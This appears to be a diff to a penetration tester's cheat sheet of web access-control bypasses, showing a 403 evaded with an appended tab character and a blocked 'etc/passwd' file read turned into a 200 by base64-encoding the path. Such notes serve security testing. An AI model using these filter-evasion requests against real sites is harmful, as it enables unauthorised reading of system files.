@@ -6,3 +6,8 @@ Original URL: https://webapp.com/api.php --> 403 Forbidden
 Modified URL: https://webapp.com/api.php (%09) --> 200 OK
 
 -------------------------------------
+
+url/?f=etc/passwd ==> 403
+url/?f=L2V0Yy9wYXNzd2Q= ==> 200      #encode etc/passwd as base64
+
+-----------------------------------------
